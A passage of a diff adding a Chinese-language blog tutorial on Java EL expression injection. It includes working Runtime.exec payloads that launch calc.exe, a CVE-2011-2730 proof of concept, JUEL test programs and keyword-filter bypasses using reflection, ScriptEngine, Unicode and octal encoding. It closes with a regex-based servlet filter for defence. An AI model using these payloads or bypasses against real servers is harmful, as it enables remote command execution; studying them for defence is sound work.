class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>'getRuntime'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span>'calc<span class="token punctuation">.</span>exe'<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><p>比如这里有一个参数 <code>a</code> 是可控的，并且可以直接插入到 JSP 代码中，这种场景是非常常见的</p>
+<p>举个简单的例子，如果登录界面，username 可控，并且判断不严格的情况下，就可以造成这种攻击：</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Title&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240719115249990.png" alt="image-20240719115249990"></p>
+<p>实际场景中，是几乎没有也无法<strong>直接从外部控制 JSP 页面中的 EL表达式</strong>的。而目前已知的 EL表达式注入漏洞都是<strong>框架层面服务端执行的 EL表达式</strong>外部可控导致的</p>
+<hr>
+<h2 id="CVE-2011-2730"><a href="#CVE-2011-2730" class="headerlink" title="CVE-2011-2730"></a>CVE-2011-2730</h2><p>poc：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>spring<span class="token operator">:</span>message text<span class="token operator">=</span><span class="token string">"$&#123;/"</span><span class="token operator">/</span><span class="token string">".getClass().forName(/"</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token operator">/</span><span class="token string">").getMethod(/"</span>getRuntime<span class="token operator">/</span><span class="token string">",null).invoke(null,null).exec(/"</span>calc<span class="token operator">/</span><span class="token string">",null).toString()&#125;"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>spring<span class="token operator">:</span>message<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h3 id="JUEL"><a href="#JUEL" class="headerlink" title="JUEL"></a>JUEL</h3><blockquote>
+<p>EL 曾经是 <code>JSTL</code> 的一部分。然后，EL 进入了 JSP 2.0 标准。现在，尽管是 JSP 2.1 的一部分，但 EL API 已被分离到包  <code>javax.el</code> 中， 并且已删除了对核心 JSP 类的所有依赖关系。换句话说：EL 已准备好在非 JSP 应用程序中使用</p>
+</blockquote>
+<p>也就是说，现在 EL 表达式所依赖的包 <code>javax.el</code> 等都在 <code>JUEL</code> 相关的 jar 包中</p>
+<p>需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7</p>
+<p>juelExec.java</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactoryImpl</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">SimpleContext</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactory</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ValueExpression</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> juelExec <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">ExpressionFactory</span> expressionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExpressionFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">SimpleContext</span> simpleContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token comment">// failed  </span>
+ <span class="token comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;"; // ok String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;";  </span>
+        <span class="token class-name">ValueExpression</span> valueExpression <span class="token operator">=</span> expressionFactory<span class="token punctuation">.</span><span class="token function">createValueExpression</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">,</span> exp<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>valueExpression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="利用反射机制"><a href="#利用反射机制" class="headerlink" title="利用反射机制"></a>利用反射机制</h3><p>即前面的payload，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤</p>
+<h3 id="利用ScriptEngine调用JS引擎"><a href="#利用ScriptEngine调用JS引擎" class="headerlink" title="利用ScriptEngine调用JS引擎"></a>利用ScriptEngine调用JS引擎</h3><p>ScriptEngineExec.java</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet</span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactoryImpl</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">de<span class="token punctuation">.</span>odysseus<span class="token punctuation">.</span>el<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">SimpleContext</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ExpressionFactory</span></span><span class="token punctuation">;</span>  
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>el<span class="token punctuation">.</span></span><span class="token class-name">ValueExpression</span></span><span class="token punctuation">;</span>  
+  
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ScriptEngineExec</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">ExpressionFactory</span> expressionFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExpressionFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">SimpleContext</span> simpleContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token comment">// failed  </span>
+ <span class="token comment">// String exp = "$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;"; // ok String exp = "$&#123;''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('Calc.exe')\")&#125;\n" +  </span>
+                <span class="token string">" "</span><span class="token punctuation">;</span>  
+        <span class="token class-name">ValueExpression</span> valueExpression <span class="token operator">=</span> expressionFactory<span class="token punctuation">.</span><span class="token function">createValueExpression</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">,</span> exp<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>valueExpression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>simpleContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+    <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token punctuation">&#123;</span>''<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.script.ScriptEngineManager"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime.getRuntime().exec('calc')"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="利用Unicode编码绕过"><a href="#利用Unicode编码绕过" class="headerlink" title="利用Unicode编码绕过"></a>利用Unicode编码绕过</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java">\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="利用八进制绕过"><a href="#利用八进制绕过" class="headerlink" title="利用八进制绕过"></a>利用八进制绕过</h3><p>构造脚本：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">str <span class="token operator">=</span> <span class="token string">"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;"</span>
+result <span class="token operator">=</span> <span class="token string">""</span>
+<span class="token keyword">for</span> s in str<span class="token operator">:</span>
+  num <span class="token operator">=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> <span class="token function">oct</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
+  result <span class="token operator">+=</span> num
+<span class="token function">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">\<span class="token number">44</span>\<span class="token number">173</span>\<span class="token number">47</span>\<span class="token number">47</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">103</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">163</span>\<span class="token number">163</span>\<span class="token number">50</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">146</span>\<span class="token number">157</span>\<span class="token number">162</span>\<span class="token number">116</span>\<span class="token number">141</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">152</span>\<span class="token number">141</span>\<span class="token number">166</span>\<span class="token number">141</span>\<span class="token number">56</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">156</span>\<span class="token number">147</span>\<span class="token number">56</span>\<span class="token number">122</span>\<span class="token number">165</span>\<span class="token number">156</span>\<span class="token number">164</span>\<span class="token number">151</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">115</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">150</span>\<span class="token number">157</span>\<span class="token number">144</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">145</span>\<span class="token number">170</span>\<span class="token number">145</span>\<span class="token number">143</span>\<span class="token number">47</span>\<span class="token number">54</span>\<span class="token number">47</span>\<span class="token number">47</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">103</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">163</span>\<span class="token number">163</span>\<span class="token number">50</span>\<span class="token number">51</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">151</span>\<span class="token number">156</span>\<span class="token number">166</span>\<span class="token number">157</span>\<span class="token number">153</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">47</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">103</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">163</span>\<span class="token number">163</span>\<span class="token number">50</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">146</span>\<span class="token number">157</span>\<span class="token number">162</span>\<span class="token number">116</span>\<span class="token number">141</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">152</span>\<span class="token number">141</span>\<span class="token number">166</span>\<span class="token number">141</span>\<span class="token number">56</span>\<span class="token number">154</span>\<span class="token number">141</span>\<span class="token number">156</span>\<span class="token number">147</span>\<span class="token number">56</span>\<span class="token number">122</span>\<span class="token number">165</span>\<span class="token number">156</span>\<span class="token number">164</span>\<span class="token number">151</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">115</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">150</span>\<span class="token number">157</span>\<span class="token number">144</span>\<span class="token number">50</span>\<span class="token number">47</span>\<span class="token number">147</span>\<span class="token number">145</span>\<span class="token number">164</span>\<span class="token number">122</span>\<span class="token number">165</span>\<span class="token number">156</span>\<span class="token number">164</span>\<span class="token number">151</span>\<span class="token number">155</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">56</span>\<span class="token number">151</span>\<span class="token number">156</span>\<span class="token number">166</span>\<span class="token number">157</span>\<span class="token number">153</span>\<span class="token number">145</span>\<span class="token number">50</span>\<span class="token number">156</span>\<span class="token number">165</span>\<span class="token number">154</span>\<span class="token number">154</span>\<span class="token number">51</span>\<span class="token number">54</span>\<span class="token number">47</span>\<span class="token number">143</span>\<span class="token number">141</span>\<span class="token number">154</span>\<span class="token number">143</span>\<span class="token number">56</span>\<span class="token number">145</span>\<span class="token number">170</span>\<span class="token number">145</span>\<span class="token number">47</span>\<span class="token number">51</span>\<span class="token number">175</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>过滤关键字：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ELInjectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token comment">// Regex pattern to detect potential EL injections</span>
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">EL_INJECTION_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"\\$\\&#123;[^&#125;]+\\&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// Initialization code if necessary</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span>
+            <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">HttpServletRequest</span> httpRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>
+
+            <span class="token comment">// Check query parameters</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> param <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialELInjection</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential EL injection detected in parameter: "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token comment">// Check headers</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> header <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeaderNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token class-name">String</span> headerValue <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialELInjection</span><span class="token punctuation">(</span>headerValue<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential EL injection detected in header: "</span> <span class="token operator">+</span> header<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token comment">// Continue with the filter chain</span>
+        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token comment">// Cleanup code if necessary</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">// Method to check if a value contains potential EL injection patterns</span>
+    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isPotentialELInjection</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token constant">EL_INJECTION_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>web.xml配置</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.example.filters.ELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>ELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>EL_INJECTION_PATTERN</strong>：使用正则表达式<code>\\$\\&#123;[^&#125;]+\\&#125;</code>来检测EL表达式注入的模式。</p>
+<p><strong>doFilter方法</strong>：</p>
+<ul>
+<li>检查请求参数和请求头中的值是否包含潜在的EL注入模式。</li>
+<li>如果检测到潜在的EL注入，抛出<code>ServletException</code>，阻止请求继续处理。</li>
+</ul>
+<p><strong>init和destroy方法</strong>：这些方法用于在过滤器的初始化和销毁时执行任何必要的代码。</p>
+<p>如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法：</p>
